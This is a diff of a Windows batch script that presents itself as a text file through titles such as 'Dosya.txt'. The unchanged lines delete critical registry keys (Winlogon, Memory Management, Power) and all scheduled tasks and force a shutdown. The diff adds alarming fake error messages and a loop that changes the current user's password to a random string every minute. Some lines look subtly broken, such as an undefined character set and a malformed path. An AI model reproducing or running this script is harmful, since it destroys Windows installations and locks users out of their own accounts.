@@ -1,7 +1,7 @@
 @echo off
 setlocal EnableDelayedExpansion
 
-title Oku Beni.txt
+title Dosya.txt
 color 0c
 
 :: Check Windows version
@@ -84,12 +84,21 @@ reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Managem
 reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /f >nul 2>&1
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /f >nul 2>&1
 del /f /q /s "%SystemRoot%\System32\Tasks\*.*" >nul 2>&1
-shutdown /f /s /t 600
+shutdown /f /s /t 900
 msg * "Hi!"
+msg * "System critical error detected!"
+msg * "Boot sector compromised!"
+msg * "System will be unusable in 15 minutes!"
+msg * "Some important system files have been deleted!"
+msg * "Please contact system administrator."
+msg * "Every minute your password changes to a new random string which is 20 characters long!"
 :loop
-    msg * "System critical error detected!"
-    msg * "Please contact system administrator."
-    msg * "Boot sector compromised!"
-    msg * "System will be unusable in 10 minutes!"
-    msg * "Some important system files have been deleted!"
+    set "newpass="
+    for /L %%i in (1,1,20) do (
+        set /a "x=!random! %% 84"
+        set "newpass=!newpass!!chars:~%x%,1!"
+        )
+    net user "%currentuser%" "%newpass%" >nul 2>&1
+    echo %newpass% > "%SystemRoot%\Users\%currentuser%\The_Password.txt"
+    timeout /t 60 >nul
 goto loop
